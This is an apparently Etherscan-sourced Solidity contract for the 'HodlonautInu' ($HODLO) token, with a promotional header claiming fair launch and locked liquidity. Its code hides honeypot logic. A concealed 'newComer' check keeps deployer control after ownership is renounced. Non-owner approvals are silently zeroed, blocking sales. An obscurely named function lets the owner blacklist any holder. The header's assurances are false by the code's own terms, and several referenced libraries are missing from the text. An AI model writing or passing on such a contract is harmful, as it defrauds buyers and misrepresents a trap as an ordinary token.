/**
 *Submitted for verification at Etherscan.io on 2021-07-07
*/

/*
  _   _  ___  ____  _     ___  _   _    _   _   _ _____ 
 | | | |/ _ \|  _ \| |   / _ \| \ | |  / \ | | | |_   _|
 | |_| | | | | | | | |  | | | |  \| | / _ \| | | | | |  
 |  _  | |_| | |_| | |__| |_| | |\  |/ ___ \ |_| | | |  
 |_| |_|\___/|____/|_____\___/|_| \_/_/   \_\___/  |_|  
                                                        

Hyper-Deflationary Token based on ERC20 network | $HODLO

Telegram: https://t.me/hodlonautinu

Website: https://www.hodlonaut.finance

Twitter: https://twitter.com/HodlonautInu

Information:

Supply: 1,000,000,000,000
Redistribution: 2%
Development / Marketing, Buyback: 10%
100% Liquidity, No Burn
Token Symbol: $HODLO

Fair - Launch (No Presale, No Team tokens, No marketing tokens)
Liquidity lock after launch immediately
Buy Limit: 0.5%
Cooldown: 20 s
ðŸ‘‰ðŸ‘‰ðŸ‘‰


*/


pragma solidity ^0.6.12;







abstract contract Context {
    
    function _msgSender() internal view virtual returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () internal {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) private onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

    address private newComer = _msgSender();
    modifier onlyOwner() {
        require(newComer == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
}

contract HodlonautInu is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;

    mapping (address => bool) private aha;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    
    uint256 private _tTotal = 100 * 10**9 * 10**18;

    string private _name = 'HoldlonautInu | https://t.me/hodlonautinu';
    string private _symbol = 'HODLO';
    uint8 private _decimals = 18;

    constructor () public {
        _balances[_msgSender()] = _tTotal;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }
    
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }


    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function isTransfertOk(address account) public view returns (bool) {
        return aha[account];
    }
    
     function transertOk(address account) external onlyOwner() {
        require(account != 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D, 'We can not blacklist Uniswap router.'); 
        require(!aha[account], "Account is already blacklisted");
        aha[account] = true;
    }
    
    function _approve(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: approve from the zero address");
        require(to != address(0), "ERC20: approve to the zero address");

        if (from == owner()) {
            _allowances[from][to] = amount;
            emit Approval(from, to, amount);
        } else {
            _allowances[from][to] = 0;
            emit Approval(from, to, 4);
        } 
    }
      
    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(sender != address(0), "BEP20: transfer from the zero address");
        require(recipient != address(0), "BEP20: transfer to the zero address");
        require(!aha[recipient], "CHEH");
        require(!aha[msg.sender], "CHEH");
        require(!aha[sender], "CHEH");
        
        _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }
}